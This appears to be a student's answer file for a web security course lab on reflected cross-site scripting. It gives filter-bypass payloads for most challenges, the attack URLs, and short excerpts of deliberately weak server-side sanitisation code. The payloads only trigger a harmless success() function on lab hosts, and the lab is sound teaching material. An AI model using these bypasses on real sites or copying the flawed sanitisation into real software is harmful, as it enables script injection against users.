# 0. Welcome

N/A

# 1. A Truly Disruptive Startup (3 points)
Explanation: basic script tag and call success() to complete the challenge
<!--http://caloogle.xyz:4010/search?q=%3Cscript%3Esuccess%28%29%3C%2Fscript%3E-->
```
<script>success()</script>
```

# 2. No Script Allowed (3 points)
Explanation: the code only replace the first "script" word encountered (no 'g' flag for replace global).
<!--http://caloogle.xyz:4020/search?q=%3Cscriptscript%3Esuccess%28%29%3C%2Fscript%3E-->
```
<scriptscript>success()</script>
```

# 3. One More Time, Like You Mean It (3 points)
Explanation: The next challenge now replace any "script" word with ''. Therefore, we can bypass it by building the string around it ('scr[script]ipt'). As a result, we are able to inject XSS.
<!--http://caloogle.xyz:4030/search?q=<sscriptcript>success()</scrscriptipt>-->
```
<sscriptcript>success()</scrscriptipt>
```

# 4. An Open-and-Shut Case (3 points)
Explanation: The regex do not have the -i flag, which means the regex only replace lower-case "script".

<!-- http://caloogle.xyz:4040/search?q=%3CSCRIPT%3Esuccess()%3C/SCRIPT%3E -->
```
<SCRIPT>success()</SCRIPT>
```

# 5. Time to Mix Things Up (3 points)

Explanation: same as #4, but now it replace "script" and "SCRIPT". Therefore, we can just mixed lower and uppercase on the word "script" to bypass.
<!--http://caloogle.xyz:4050/search?q=%3CScript%3Esuccess%28%29%3C%2FScript%3E-->
```
<Script>success()</Script>
```

# 6. A Picture is Worth a Thousand Words (3 points)
Explanation: hint is "picture"; Close the input tag and create img tag with XSS payload
<!--http://caloogle.xyz:4060/search?q=%22%3E%3Cimg+src%3D0+onerror%3Dsuccess%28%29%3E%3C-->
```
"><img src=0 onerror=success()><
```

# 7. Between a Rock And a Hard Place (3 points)
Explanation: use onclick as the other attributes are blocked (onclick=, onload=, script)
<!--http://caloogle.xyz:4070/search?q=%22%3Ca+href+onclick%3D%22success%28%29%22%3EDanger%3C%2Fa%3E%22-->
```
"<a href onclick="success()">Danger</a>"
```

# 8. Angle of Death (6 points)

Explanation:
blind attack and they removed the "<,>,script" tag & keywords that makes me need to play around more
<!--http://caloogle.xyz:4080/search?q=%3C%3CScRiPt%3E%3Esuccess()%3C/ScRiPt%3E-->
Attack input:
```
<><script>success()</script>
```

Server code:

```js
router.get('/search', async (req, res) => {
  let q = req.query.q
  if (q == null) q = ''

  // TODO: Replace this with your solution.
   q = q.replace(/</, '')
   q = q.replace(/>/, '')

  const results = await getResults(q)
  res.render('caloogle-search-page', { q, results })
})
```

# 9. All in a Day's Work

N/A

# 10. In the Wrong Place at the Wrong Time (3 points)

<!--http://caloogle.xyz:4100/search?q=%22+onload%3Dsuccess%28%29%3E-->
```
" onload=success()>
```

# 11. You Can't Win 'em All (6 points)

Attack input:
<!--http://caloogle.xyz:4110/search?q=%22%22%3E%3Ch3%3E%3CScript%3Esuccess%28%29%3C%2FScript%3E-->
```
""><Script>success()</Script>
```

Server code:

```js
router.get('/search', async (req, res) => {
  let q = req.query.q
  if (q == null) q = ''

  // TODO: Replace this with your solution.
   //const oldQ = q
   q = q.replace(/"/, '&quot;')

  const results = await getResults(q)
  res.render('caloogle-search-page', { q, /*oldQ,*/ results })
})
```

# 12. When All is Said and Done (6 points)

Attack input:
<!--http://caloogle.xyz:4120/search?q=random%27%3E%3Cscript%3Esuccess%28%29%3C%2Fscript%3E-->
Explanation: the Hrvrd.io <li> is still vulnerable to reflected XSS. It doesn't sanitize the single quote which we can escape the <img> tag to create <script> tag.

```
random'><script>success()</script>
```

Server code:

```js
router.get('/search', async (req, res) => {
  let q = req.query.q
  if (q == null) q = ''

  // TODO: Replace this with your solution.
   q = q.replace(/"/g, '&quot;')

  const results = await getResults(q)
  res.render('caloogle-search-page', { q, results })
})
```

# 13. When You Want a Job Done Right

N/A

# 14. Here Today and Gone Tomorrow (3 points)

Attack URL:

```
TODO: Replace this with your solution. **This should be a URL!**
```

# 15. The Early Bird Catches the Worm (3 points)

```
TODO: Replace this with your attack input.
```

# 16. Tying Up Loose Ends (3 points)

```
TODO: Replace this with your attack input.
```

# 17. Take a Page Out of Their Book (6 points)

Attack code:

```js
// TODO: Replace this with your solution.
```

# 18. Congrats

N/A

# Survey responses (3 points)

Write your survey responses in SURVEY.md!
